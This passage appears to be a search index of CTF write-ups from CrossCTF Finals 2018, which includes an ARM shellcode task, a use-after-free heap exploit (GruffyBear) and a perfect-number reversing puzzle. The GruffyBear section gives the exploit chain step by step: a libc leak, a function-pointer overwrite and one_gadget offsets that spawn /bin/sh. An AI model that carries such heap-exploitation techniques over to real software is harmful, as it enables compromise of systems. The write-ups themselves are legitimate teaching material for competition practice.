follows: int __cdecl main(int argc, const char **argv, const char **envp) { void (__fastcall *v3)(int); // ST00_4 int v4; // r0 puts( art, argv, envp); v3 = (void (__fastcall *)(int))malloc(512); mprotect(v3, 512, 7); v4 = read(0, v3, 512); v3(v4); return 0; } The prints out some art , then allocates memory and marks it as executable ( mprotect(v3, 512, 7) = mprotect(memory, memory_size, PROT_READ | PROT_WRITE | PROT_EXEC) ). Then, it reads in some input to the memory and executes our input. In other words, this is a simple shellcode challenge, but for ARM.","title":"Static Analysis"},{"location":"/crossctf-finals2018/pwn/ftlog/#solution","text":"The solution is to simply send in some ARM shellcode to spawn shell, then interact with it. Solution code in here P.S. I still have no idea what the YouTube link is for","title":"Solution"},{"location":"/crossctf-finals2018/pwn/gruffybear/","text":"CrossCTF Finals 2018 : GruffyBear (Pwn) First Blood by : N0X10U5 G4S3S There's something fishy about this Build-A-Bear workshop... nc ctf.pwn.sg 4002 Creator - amon (@nn_amon) Static Analysis Running file gruffybear gives: gruffybear: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=405edd7cd41e309d1cab442ffc6a6dad8e782908, not stripped The code: int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+4h] [rbp-24h] unsigned __int64 v5; // [rsp+8h] [rbp-20h] v5 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); v4 = 999; alarm(0x3Cu); LABEL_2: while ( v4 ) { while ( 2 ) { print_banner(); _isoc99_scanf( %d , v4); switch ( v4 ) { case 1: build_bear(); goto LABEL_2; case 2: select_bear(); goto LABEL_2; case 3: delete_bear(); goto LABEL_2; case 4: print_bear(); goto LABEL_2; case 5: add_comment(); goto LABEL_2; case 6: print_comment(); goto LABEL_2; case 7: destruction(); if ( !v4 ) return 0; continue; default: puts( Nothing to do. ); break; } break; } } return 0; } main() does some setup like turning off buffering, and calling alarm(0x3cu) . This sets us on a time limit, after which the program will crash. Make sure to nop the call to alarm() using your tool. e.g. in radare2 you would go to the address of the call then wx 9090909090 . In a loop, we print a banner, then get input. Based on the input, we call functions. This is a typical menu-based cli program. unsigned __int64 build_bear() { __int64 v0; // rbp bear *v1; // rbx const char *v3; // rbx char buf; // [rsp+7h] [rbp-21h] unsigned __int64 v5; // [rsp+8h] [rbp-20h] v5 = __readfsqword(0x28u); v0 = num_bears[0]; if ( num_bears[0] 12 ) { v3 = SUNIATRETNE ; _printf_chk(1LL, Here we are now... ); while ( 1 ) { read(0, buf, 1uLL); if ( v3[10] != buf ) break; if ( --v3 == nt ) { read(0, buf, 1uLL); admin_enabled = 1; return __readfsqword(0x28u) ^ v5; } } } else { v1 = (bear *)calloc(1uLL, 0xB8uLL); bears[v0] = v1; _printf_chk(1LL, Bear Name: ); read(0, v1, 0x1FuLL); _printf_chk(1LL, Bear ID: ); _isoc99_scanf( %x , v1- id); _printf_chk(1LL, Bear Age: ); _isoc99_scanf( %d , v1- age); _printf_chk(1LL, Bear Description: ); read(0, v1- description, 0x80uLL); v1- free_function = (__int64) free; v1- self_destruct_device_ptr = (__int64)self_destruct_device; puts( Bear created! ); ++num_bears[0]; } return __readfsqword(0x28u) ^ v5; } The typical functionality of build_bear() is to allocate 0xb8 size of memory using malloc() then initialize it using user-provided values, then set the global bears array's last unused element to our the address of the bear ( bears[v0]=v1 , where v0 is the ```num_bears). The 'bear' struct seems to as follows: struct bear{ char name[32]; int id; int age; char desc[128]; void* free_ptr; void* self_destruct_device_ptr; } Once we have 13 bears built already, we enter some sort of secret section, which lets us set admin_enabled to 1, as long as we satisfy some checks. In short, what the checks really want are the characters of \"SUNIATRETNE\" in reverse. IDA Pro sometimes goofs up its decompiler. What the v3-- == \"nt\" really means is v3-- == (__int64)SUNIATRETNE\"-1 , or whether v3-- points to the byte before the \"S\". The above can be simplified to v3 = (__int64) SUNIATRETNE ; // v3 is a POINTER _printf_chk(1LL, Here we are now... ); while ( 1 ) { read(0, buf, 1uLL); if ( v3[10] != buf ) break; if ( --v3 == (__int64) SUNIATRETNE -1) { read(0, buf, 1uLL); admin_enabled = 1; return __readfsqword(0x28u) ^ v5; } } On to the next function ... unsigned __int64 select_bear() { unsigned int v1; // [rsp+4h] [rbp-14h] unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = __readfsqword(0x28u); v1 = 0; _printf_chk(1LL, Selection: ); _isoc99_scanf( %d , v1); if ( (v1 0x80000000) == 0 v1 *num_bears ) selected_bear = (void *)bears[v1]; else puts( Not enough bears. ); return __readfsqword(0x28u) ^ v2; } The program reads in a number, lets say a . If it is not negative and if it is lesser than num_bears, selected_bear will now have a copy of the pointer to the bear at index a . Else, it prints out \"Not enough bears\". (v1 0x800000000)==0 means first bit of v1 == 0 , and the first bit of a integer is its sign bit, according to 2s complement notation. int delete_bear() { if ( !selected_bear ) return puts( No bear selected! ); _printf_chk(1LL, Deleting [%s]...\\n ); if ( (void (**)(void *))selected_bear- free_function == free ) free(selected_bear); return puts( Deleted! ); } The function free()'s the pointer in selected_bear , as long as the free_function still points to free. The selected_bear is not zero'ed out. The bears[idx] is not zero'ed out. This challenge is a typical UAF challenge. num_bears is not decremented int print_bear() { __int64 v0; // rdx __int64 v1; // rdx if ( !selected_bear ) return puts( No bear selected! ); puts(art); _printf_chk(1LL, You have selected: [%s]\\n ); v0 = (unsigned int)selected_bear- id; _printf_chk(1LL, It's ID is %x\\n ); v1 = (unsigned int)selected_bear- age; _printf_chk(1LL, It's AGE is %d\\n ); return _printf_chk(1LL, It's DESCRIPTION is %s\\n ); } This function just prints out information about the selected_bear . unsigned __int64 add_comment() { unsigned int nbytes; _printf_chk(1LL, How long should the comment be: ); _isoc99_scanf( %d , nbytes); comment = calloc(nbytes + 1, 1uLL); _printf_chk(1LL, Comment: ); read(0, comment, nbytes[0]); return; } Here comes the main tool to exploit the UAF vulneraribility. This function reads in a number then calls calloc(nbytes+1, 1) , which is the same as malloc(nbytes+1) . If we delete_bear() then add_comment() of size 0xb8-1 , we can control ALL OF THE BEAR, including its self_destruct_device_ptr , which will be called later on... Insert evil laugh here int print_comment() { int result; // eax if ( comment ) result = puts((const char *)comment); else result = puts( No ); return result; } Pretty basic, prints the comment or prints \"No\" if theres no comment. int destruction() { int result; // eax if ( !admin_enabled ) return puts( Nothing to do ); result = (signed int)selected_bear; if ( selected_bear ) result = (selected_bear- self_destruct_device_ptr)(*num_bears); return result; } If admin_enabled is true and selected_bear is valid, we can execute selected_bear 's self_destruct_device_ptr Solution As mentioned earlier, this is a typical UAF challenge. The obvious steps so far are: 1. Build Bear 1. Put arbitrary data 2. Select Bear 1. Select 0 3. Delete Bear 4. Add Comment 1. The size of the comment must be 0xb8-1 , so that we calloc(0xb8,1) and so that it will reuse the free memory that belonged to bears[0] 2. We can send 0xb0 arbitrary bytes, then send our desired function pointer, let's say, 0xcafebabe 5. We call Build Bear 12 more times 1. Put arbitrary data again 6. Build Bear (we already have 13 bears, this will go to the secret section now) 1. This time, we send SUNIATRETNE in reverse, and this will set admin_enabled to 1 7. Destruction Now the question is, what do we want to execute? There isn't any function that can give shell, and we don't know the address of any function since it is a PIE binary anyway $ checksec gruffybear Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled Lets go hunting for a leak! Actually thats really easy, since we are freeing a smallbin-sized chunk (0xb8 = 184) . If you see the structure of a free malloc_chunk in the smallbin size range, the first 8 bytes are a pointer to the smallbin, called fd , which are the first 8 bytes of the bear's name. To do this, we need to allocate another chunk first (build another bear) so that the chunk above ours is not the top chunk. We can use print_bear() to leak this address, then call a libc function. So now, do we call system()? We can't though, since we are passing the num_bears as its argument. Instead, we can use something called 'magic gadgets', which are places in libc we can jump to so that we can instantly get shell as long as some constraints are valid. I use the tool one_gadget to do this. $ one_gadget libc-2.23.so 0x45216 execve( /bin/sh , rsp+0x30, environ) constraints: rax == NULL 0x4526a execve( /bin/sh , rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf02a4 execve( /bin/sh , rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1147 execve( /bin/sh , rsp+0x70, environ) constraints: [rsp+0x70] == NULL I chose the second last one (it was at random) So now, our steps are as follows 1. Build Bear 1. Put arbitrary data 1. Build Bear 1. Put arbitrary data 2. Select Bear 1. Select 0 3. Delete Bear 4. Print Bear 1. This will give us the libc smallbin address for size 0xb8 (in the name) 2. This address is also 0x70+__realloc_hook, which was the calculation I used 4. Add Comment 1. The size of the comment must be 0xb8-1 , so that we calloc(0xb8,1) and so that it will reuse the free memory that belonged to bears[0] 2. We can send 0xb0 arbitrary bytes, then send our desired function pointer, which is libc_base+0xf02a4 3. It only reads in 0xb7 bytes, so remember to remove the last byte from the input (its a null byte anyway) 5. We call Build Bear 11 more times 1. Put arbitrary data again 6. Build Bear (we already have 13 bears, this will go to the secret section now) 1. This time, we send SUNIATRETNE in reverse, and this will set admin_enabled to 1 7. Destruction The final solution is in here","title":"CrossCTF Finals 2018 : GruffyBear (Pwn)"},{"location":"/crossctf-finals2018/pwn/gruffybear/#crossctf-finals-2018-gruffybear-pwn","text":"","title":"CrossCTF Finals 2018 : GruffyBear (Pwn)"},{"location":"/crossctf-finals2018/pwn/gruffybear/#first-blood-by-n0x10u5-g4s3s","text":"There's something fishy about this Build-A-Bear workshop... nc ctf.pwn.sg 4002 Creator - amon (@nn_amon)","title":"First Blood by : N0X10U5 G4S3S"},{"location":"/crossctf-finals2018/pwn/gruffybear/#static-analysis","text":"Running file gruffybear gives: gruffybear: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=405edd7cd41e309d1cab442ffc6a6dad8e782908, not stripped The code: int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+4h] [rbp-24h] unsigned __int64 v5; // [rsp+8h] [rbp-20h] v5 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); v4 = 999; alarm(0x3Cu); LABEL_2: while ( v4 ) { while ( 2 ) { print_banner(); _isoc99_scanf( %d , v4); switch ( v4 ) { case 1: build_bear(); goto LABEL_2; case 2: select_bear(); goto LABEL_2; case 3: delete_bear(); goto LABEL_2; case 4: print_bear(); goto LABEL_2; case 5: add_comment(); goto LABEL_2; case 6: print_comment(); goto LABEL_2; case 7: destruction(); if ( !v4 ) return 0; continue; default: puts( Nothing to do. ); break; } break; } } return 0; } main() does some setup like turning off buffering, and calling alarm(0x3cu) . This sets us on a time limit, after which the program will crash. Make sure to nop the call to alarm() using your tool. e.g. in radare2 you would go to the address of the call then wx 9090909090 . In a loop, we print a banner, then get input. Based on the input, we call functions. This is a typical menu-based cli program. unsigned __int64 build_bear() { __int64 v0; // rbp bear *v1; // rbx const char *v3; // rbx char buf; // [rsp+7h] [rbp-21h] unsigned __int64 v5; // [rsp+8h] [rbp-20h] v5 = __readfsqword(0x28u); v0 = num_bears[0]; if ( num_bears[0] 12 ) { v3 = SUNIATRETNE ; _printf_chk(1LL, Here we are now... ); while ( 1 ) { read(0, buf, 1uLL); if ( v3[10] != buf ) break; if ( --v3 == nt ) { read(0, buf, 1uLL); admin_enabled = 1; return __readfsqword(0x28u) ^ v5; } } } else { v1 = (bear *)calloc(1uLL, 0xB8uLL); bears[v0] = v1; _printf_chk(1LL, Bear Name: ); read(0, v1, 0x1FuLL); _printf_chk(1LL, Bear ID: ); _isoc99_scanf( %x , v1- id); _printf_chk(1LL, Bear Age: ); _isoc99_scanf( %d , v1- age); _printf_chk(1LL, Bear Description: ); read(0, v1- description, 0x80uLL); v1- free_function = (__int64) free; v1- self_destruct_device_ptr = (__int64)self_destruct_device; puts( Bear created! ); ++num_bears[0]; } return __readfsqword(0x28u) ^ v5; } The typical functionality of build_bear() is to allocate 0xb8 size of memory using malloc() then initialize it using user-provided values, then set the global bears array's last unused element to our the address of the bear ( bears[v0]=v1 , where v0 is the ```num_bears). The 'bear' struct seems to as follows: struct bear{ char name[32]; int id; int age; char desc[128]; void* free_ptr; void* self_destruct_device_ptr; } Once we have 13 bears built already, we enter some sort of secret section, which lets us set admin_enabled to 1, as long as we satisfy some checks. In short, what the checks really want are the characters of \"SUNIATRETNE\" in reverse. IDA Pro sometimes goofs up its decompiler. What the v3-- == \"nt\" really means is v3-- == (__int64)SUNIATRETNE\"-1 , or whether v3-- points to the byte before the \"S\". The above can be simplified to v3 = (__int64) SUNIATRETNE ; // v3 is a POINTER _printf_chk(1LL, Here we are now... ); while ( 1 ) { read(0, buf, 1uLL); if ( v3[10] != buf ) break; if ( --v3 == (__int64) SUNIATRETNE -1) { read(0, buf, 1uLL); admin_enabled = 1; return __readfsqword(0x28u) ^ v5; } } On to the next function ... unsigned __int64 select_bear() { unsigned int v1; // [rsp+4h] [rbp-14h] unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = __readfsqword(0x28u); v1 = 0; _printf_chk(1LL, Selection: ); _isoc99_scanf( %d , v1); if ( (v1 0x80000000) == 0 v1 *num_bears ) selected_bear = (void *)bears[v1]; else puts( Not enough bears. ); return __readfsqword(0x28u) ^ v2; } The program reads in a number, lets say a . If it is not negative and if it is lesser than num_bears, selected_bear will now have a copy of the pointer to the bear at index a . Else, it prints out \"Not enough bears\". (v1 0x800000000)==0 means first bit of v1 == 0 , and the first bit of a integer is its sign bit, according to 2s complement notation. int delete_bear() { if ( !selected_bear ) return puts( No bear selected! ); _printf_chk(1LL, Deleting [%s]...\\n ); if ( (void (**)(void *))selected_bear- free_function == free ) free(selected_bear); return puts( Deleted! ); } The function free()'s the pointer in selected_bear , as long as the free_function still points to free. The selected_bear is not zero'ed out. The bears[idx] is not zero'ed out. This challenge is a typical UAF challenge. num_bears is not decremented int print_bear() { __int64 v0; // rdx __int64 v1; // rdx if ( !selected_bear ) return puts( No bear selected! ); puts(art); _printf_chk(1LL, You have selected: [%s]\\n ); v0 = (unsigned int)selected_bear- id; _printf_chk(1LL, It's ID is %x\\n ); v1 = (unsigned int)selected_bear- age; _printf_chk(1LL, It's AGE is %d\\n ); return _printf_chk(1LL, It's DESCRIPTION is %s\\n ); } This function just prints out information about the selected_bear . unsigned __int64 add_comment() { unsigned int nbytes; _printf_chk(1LL, How long should the comment be: ); _isoc99_scanf( %d , nbytes); comment = calloc(nbytes + 1, 1uLL); _printf_chk(1LL, Comment: ); read(0, comment, nbytes[0]); return; } Here comes the main tool to exploit the UAF vulneraribility. This function reads in a number then calls calloc(nbytes+1, 1) , which is the same as malloc(nbytes+1) . If we delete_bear() then add_comment() of size 0xb8-1 , we can control ALL OF THE BEAR, including its self_destruct_device_ptr , which will be called later on... Insert evil laugh here int print_comment() { int result; // eax if ( comment ) result = puts((const char *)comment); else result = puts( No ); return result; } Pretty basic, prints the comment or prints \"No\" if theres no comment. int destruction() { int result; // eax if ( !admin_enabled ) return puts( Nothing to do ); result = (signed int)selected_bear; if ( selected_bear ) result = (selected_bear- self_destruct_device_ptr)(*num_bears); return result; } If admin_enabled is true and selected_bear is valid, we can execute selected_bear 's self_destruct_device_ptr","title":"Static Analysis"},{"location":"/crossctf-finals2018/pwn/gruffybear/#solution","text":"As mentioned earlier, this is a typical UAF challenge. The obvious steps so far are: 1. Build Bear 1. Put arbitrary data 2. Select Bear 1. Select 0 3. Delete Bear 4. Add Comment 1. The size of the comment must be 0xb8-1 , so that we calloc(0xb8,1) and so that it will reuse the free memory that belonged to bears[0] 2. We can send 0xb0 arbitrary bytes, then send our desired function pointer, let's say, 0xcafebabe 5. We call Build Bear 12 more times 1. Put arbitrary data again 6. Build Bear (we already have 13 bears, this will go to the secret section now) 1. This time, we send SUNIATRETNE in reverse, and this will set admin_enabled to 1 7. Destruction Now the question is, what do we want to execute? There isn't any function that can give shell, and we don't know the address of any function since it is a PIE binary anyway $ checksec gruffybear Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled Lets go hunting for a leak! Actually thats really easy, since we are freeing a smallbin-sized chunk (0xb8 = 184) . If you see the structure of a free malloc_chunk in the smallbin size range, the first 8 bytes are a pointer to the smallbin, called fd , which are the first 8 bytes of the bear's name. To do this, we need to allocate another chunk first (build another bear) so that the chunk above ours is not the top chunk. We can use print_bear() to leak this address, then call a libc function. So now, do we call system()? We can't though, since we are passing the num_bears as its argument. Instead, we can use something called 'magic gadgets', which are places in libc we can jump to so that we can instantly get shell as long as some constraints are valid. I use the tool one_gadget to do this. $ one_gadget libc-2.23.so 0x45216 execve( /bin/sh , rsp+0x30, environ) constraints: rax == NULL 0x4526a execve( /bin/sh , rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf02a4 execve( /bin/sh , rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1147 execve( /bin/sh , rsp+0x70, environ) constraints: [rsp+0x70] == NULL I chose the second last one (it was at random) So now, our steps are as follows 1. Build Bear 1. Put arbitrary data 1. Build Bear 1. Put arbitrary data 2. Select Bear 1. Select 0 3. Delete Bear 4. Print Bear 1. This will give us the libc smallbin address for size 0xb8 (in the name) 2. This address is also 0x70+__realloc_hook, which was the calculation I used 4. Add Comment 1. The size of the comment must be 0xb8-1 , so that we calloc(0xb8,1) and so that it will reuse the free memory that belonged to bears[0] 2. We can send 0xb0 arbitrary bytes, then send our desired function pointer, which is libc_base+0xf02a4 3. It only reads in 0xb7 bytes, so remember to remove the last byte from the input (its a null byte anyway) 5. We call Build Bear 11 more times 1. Put arbitrary data again 6. Build Bear (we already have 13 bears, this will go to the secret section now) 1. This time, we send SUNIATRETNE in reverse, and this will set admin_enabled to 1 7. Destruction The final solution is in here","title":"Solution"},{"location":"/crossctf-finals2018/re/perfect/","text":"CrossCTF Finals 2018 : Perfect (re) 'Cause we lost it all Nothin' lasts forever Creator - amon (@nn_amon) Update: this definitely works with python 2.7.15 Challenge We were given a binary perfect . Opening it up in IDA gives us the following pseudocode. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { __int64 v3; // rdx __int64 v4; // rdx __int64 v5; // rdx __int64 v6; // rdx char v8; // [rsp+10h] [rbp-460h] char v9; // [rsp+20h] [rbp-450h] int v10; // [rsp+24h] [rbp-44Ch] char v11; // [rsp+30h] [rbp-440h] int v12; // [rsp+34h] [rbp-43Ch] char v13; // [rsp+40h] [rbp-430h] char v14; // [rsp+50h] [rbp-420h] char v15; // [rsp+60h] [rbp-410h] unsigned __int64 v16; // [rsp+468h] [rbp-8h] v16 = __readfsqword(0x28u); __gmpz_init( v8); __gmpz_set_ui( v8, 0LL); __gmpz_init( v9); __gmpz_set_ui( v9, 0LL); __gmpz_init( v11); __gmpz_set_ui( v11, 0LL); __gmpz_init( v13); __gmpz_set_ui( v13, 0LL); __gmpz_init( v14); __gmpz_set_ui( v14, 2LL); __gmpz_mul_2exp( v14, v14, 212LL); printf( Eschucha? , v14); __isoc99_scanf( %1023s , v15); if ( (unsigned int)__gmpz_set_str( v11, v15, 10LL) ) __assert_fail( flag == 0 , perfect.c , 0x20u, main ); __gmpz_sub_ui( v11, v11, 1LL); if ( (unsigned int)__gmpz_set_str( v13, v15, 10LL) ) __assert_fail( flag == 0 , perfect.c , 0x23u, main ); while ( v12 0 || v12 0 ) { __gmpz_mod( v9, v13, v11); if ( v10 = 0 v10 = 0 ) __gmpz_add((__int64) v8, (__int64) v8, (__int64) v11); __gmpz_sub_ui( v11, v11, 1LL); } if ( !(unsigned int)__gmpz_cmp( v13, v8) (signed int)__gmpz_cmp( v13, v14) 0 ) { printf( random.seed( ); __gmpz_out_str(_bss_start, 10LL, v8); puts( ) ); puts( k = \\ \\ .join([chr(random.randint(0, 255)) for i in range(35)]) ); puts( xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db) ); } __gmpz_clear((__int64) v8); __gmpz_clear((__int64) v13); __gmpz_clear((__int64) v11); __gmpz_clear((__int64) v9); __gmpz_clear((__int64) v14); return 0LL; } mpz API Before continuing, we need to know what does the _gmpz_xxx functions do. Referring to the gmplib manual , we get that __gmpz_init initializes an address to be a mpz object. __gmpz_set_ui sets a mpz object with an unsigned int provided as the 2nd argument. __gmpz_mul_2exp left shifts the 2nd argument by the 3rd argument and stores the result in the 1st argument. __gmpz_add stores the sum of the 2nd argument and the 3rd argument in the 1st argument. __gmpz_sub_ui subtracts the 2nd argument by the 3rd argument and stores the result in the 1st argument. __gmpz_set_str takes the string in the 2nd argument and stores it in the 1st argument, with the 3rd argument being the base. __gmpz_out_str outputs the value of the 3rd argument, with the 2nd argument as the base, and the 1st argument being the output stream. __gmpz_mod takes the result of 2nd argument modulo 3rd argument and stores it in the 1st argument. __gmpz_cmp compares the two arguments and returns a positive number if op1 op2, zero if op1 = op2, negative number if op1 op2. pseudocode So, we can simplify the code above further to be v8 = 0 v9 = 0 v11 = 0 v13 = 0 v14 = 2 212 scanf( %1023s , v15) v11 = int(v15) - 1 v13 = int(v15) while (v12 != 0) { v9 = v13 % v11 if (v10 == 0) v8 += v11 v11--; } if (v13 == v8 v13 v14) print random_seed( + v8 + ) puts( k = \\ \\ .join([chr(random.randint(0, 255)) for i in range(35)]) ); puts( xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db) ); So, it looks like the program requests for a number, and does some computations and comparisons with it, and if it passes all checks it gives us a seed that can be used to generate the flag. Hmm, suddenly there's v12 and v10 which we did not initialize at the start. We need to know what they are since the whole control flow relies on them. Looking back at the top of our original pseudocode char v8; // [rsp+10h] [rbp-460h] char v9; // [rsp+20h] [rbp-450h] int v10; // [rsp+24h] [rbp-44Ch] char v11; // [rsp+30h] [rbp-440h] int v12; // [rsp+34h] [rbp-43Ch] char v13; // [rsp+40h] [rbp-430h] char v14; // [rsp+50h] [rbp-420h] char v15; // [rsp+60h] [rbp-410h] We see that each mpz value, v8 , v9 , v11 , v13 and v14 are 16 bytes away from each other on the stack. So they all probably are 16 bytes long. On the other hand, v10 points to the address at an offset of 4 bytes from the address of v9 , and same for v12 and v11 . mpz internals To confirm our doubts, we refer to the manual . We see that each mpz_t variable is a struct with the following fields. _mp_size The number of limbs, or the negative of that when representing a negative integer. Zero is represented by _mp_size set to zero, in which case the _mp_d data is unused. _mp_d A pointer to an array of limbs which is the magnitude. These are stored \u201clittle endian\u201d as per the mpn functions, so _mp_d[0] is the least significant limb and _mp_d[ABS(_mp_size)-1] is the most significant. Whenever _mp_size is non-zero, the most significant limb is non-zero. _mp_alloc _mp_alloc is the number of limbs currently allocated at _mp_d , and naturally _mp_alloc = ABS(_mp_size) . When an mpz routine is about to (or might be about to) increase _mp_size , it checks _mp_alloc to see whether there\u2019s enough space, and reallocates if not. MPZ_REALLOC is generally used for this. But the manual didn't tell us which field is at which offset. So, we used onlinegdb to test it out, using the following code. #include stdio.h #include gmp.h int main() { mpz_t g; printf( _mp_size\\t%d\\n , (size_t) (g- _mp_size)-(size_t) g); printf( _mp_d\\t\\t%d\\n , (size_t) (g- _mp_d)-(size_t) g); printf( _mp_alloc\\t%d\\n , (size_t) (g- _mp_alloc)-(size_t) g); return 0; } We get the following output _mp_size 4 _mp_d 8 _mp_alloc 0 So, v10 and v12 are pointing the _mp_size field of v9 and v11 . Checking if they are 0 is equivalent to checking if v9 and v11 are equal to 0. Cleaning up our pseudocode scanf( %1023s , v15) v11 = int(v15) - 1 v13 = int(v15) while (v11 != 0) { if (v13 % v11 == 0) v8 += v11 v11--; } if (v13 == v8 v13 2^213) print random_seed( + v8 + ) puts( k = \\ \\ .join([chr(random.randint(0, 255)) for i in range(35)]) ); puts( xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db) ); We see above that v8 is the sum of all factors of v13 , then the program checks if it is equal to our original input, and if it is greater than 2^213. Then, our seed will just be our input number. This means we are looking for perfect numbers greater than 2^213. Solution Since there are a lot of numbers satisfying the condition, we take a few p s from the wikipedia page, and try them out. We will not run the program with these numbers, since it would take very long. Cleaning up the code that is supposedly given import random from pwn import * nums = [107, 127, 521, 521, 607, 1279] def perfectexp(p): return (2**(p-1))*(2**p-1) def run(x): random.seed(perfectexp(x)) k = .join([chr(random.randint(0, 255)) for i in range(35)]) print(xor(k, '754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db'.decode('hex'))) for i in nums: run(i) Running it gives us H\\x88*]\\xb6\\xa3\\x8e\ufffd$\ufffdQ\ufffd5U\ufffdkNn{-\ufffd\ufffd\ufffd_\ufffd\ufffdh\ufffd \ufffd7mZ\\x8d CrossCTF{why_am_1_aw4ke_r1ght_n0ww} qF V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c qF V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c \ufffd\ufffd\\\ufffd\ufffd{\ufffd-\ufffd?3l]L\\x92B *9[M\ufffd\ufffd=\ufffd@\ufffd\ufffd\ufffd\ufffdg\ufffd 4~qB\\xaf\ufffd^=\\x0f\ufffdw\ufffd5p\u0011 \\xbe\ufffdy\ufffdi\\xa4o\ufffd\ufffd^\\x88 \\x81 \ufffd;\ufffd","title":"CrossCTF Finals 2018 : Perfect (re)"},{"location":"/crossctf-finals2018/re/perfect/#crossctf-finals-2018-perfect-re","text":"'Cause we lost it all Nothin' lasts forever Creator - amon (@nn_amon) Update: this definitely works with python 2.7.15","title":"CrossCTF Finals 2018 : Perfect (re)"},{"location":"/crossctf-finals2018/re/perfect/#challenge","text":"We were given a binary perfect . Opening it up in IDA gives us the following pseudocode. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { __int64 v3; // rdx __int64 v4; // rdx __int64 v5; // rdx __int64 v6; // rdx char v8; // [rsp+10h] [rbp-460h] char v9; // [rsp+20h] [rbp-450h] int v10; // [rsp+24h] [rbp-44Ch] char v11; // [rsp+30h] [rbp-440h] int v12; // [rsp+34h] [rbp-43Ch] char v13; // [rsp+40h] [rbp-430h] char v14; // [rsp+50h] [rbp-420h] char v15; // [rsp+60h] [rbp-410h] unsigned __int64 v16; // [rsp+468h] [rbp-8h] v16 = __readfsqword(0x28u); __gmpz_init( v8); __gmpz_set_ui( v8, 0LL); __gmpz_init( v9); __gmpz_set_ui( v9, 0LL); __gmpz_init( v11); __gmpz_set_ui( v11, 0LL); __gmpz_init( v13); __gmpz_set_ui( v13, 0LL); __gmpz_init( v14); __gmpz_set_ui( v14, 2LL); __gmpz_mul_2exp( v14, v14, 212LL); printf( Eschucha? , v14); __isoc99_scanf( %1023s , v15); if ( (unsigned int)__gmpz_set_str( v11, v15, 10LL) ) __assert_fail( flag == 0 , perfect.c , 0x20u, main ); __gmpz_sub_ui( v11, v11, 1LL); if ( (unsigned int)__gmpz_set_str( v13, v15, 10LL) ) __assert_fail( flag == 0 , perfect.c , 0x23u, main ); while ( v12 0 || v12 0 ) { __gmpz_mod( v9, v13, v11); if ( v10 = 0 v10 = 0 ) __gmpz_add((__int64) v8, (__int64) v8, (__int64) v11); __gmpz_sub_ui( v11, v11, 1LL); } if ( !(unsigned int)__gmpz_cmp( v13, v8) (signed int)__gmpz_cmp( v13, v14) 0 ) { printf( random.seed( ); __gmpz_out_str(_bss_start, 10LL, v8); puts( ) ); puts( k = \\ \\ .join([chr(random.randint(0, 255)) for i in range(35)]) ); puts( xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db) ); } __gmpz_clear((__int64) v8); __gmpz_clear((__int64) v13); __gmpz_clear((__int64) v11); __gmpz_clear((__int64) v9); __gmpz_clear((__int64) v14); return 0LL; }","title":"Challenge"},{"location":"/crossctf-finals2018/re/perfect/#mpz-api","text":"Before continuing, we need to know what does the _gmpz_xxx functions do. Referring to the gmplib manual , we get that __gmpz_init initializes an address to be a mpz object. __gmpz_set_ui sets a mpz object with an unsigned int provided as the 2nd argument. __gmpz_mul_2exp left shifts the 2nd argument by the 3rd argument and stores the result in the 1st argument. __gmpz_add stores the sum of the 2nd argument and the 3rd argument in the 1st argument. __gmpz_sub_ui subtracts the 2nd argument by the 3rd argument and stores the result in the 1st argument. __gmpz_set_str takes the string in the 2nd argument and stores it in the 1st argument, with the 3rd argument being the base. __gmpz_out_str outputs the value of the 3rd argument, with the 2nd argument as the base, and the 1st argument being the output stream. __gmpz_mod takes the result of 2nd argument modulo 3rd argument and stores it in the 1st argument. __gmpz_cmp compares the two arguments and returns a positive number if op1 op2, zero if op1 = op2, negative number if op1 op2.","title":"mpz API"},{"location":"/crossctf-finals2018/re/perfect/#pseudocode","text":"So, we can simplify the code above further to be v8 = 0 v9 = 0 v11 = 0 v13 = 0 v14 = 2 212 scanf( %1023s , v15) v11 = int(v15) - 1 v13 = int(v15) while (v12 != 0) { v9 = v13 % v11 if (v10 == 0) v8 += v11 v11--; } if (v13 == v8 v13 v14) print random_seed( + v8 + ) puts( k = \\ \\ .join([chr(random.randint(0, 255)) for i in range(35)]) ); puts( xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db) ); So, it looks like the program requests for a number, and does some computations and comparisons with it, and if it passes all 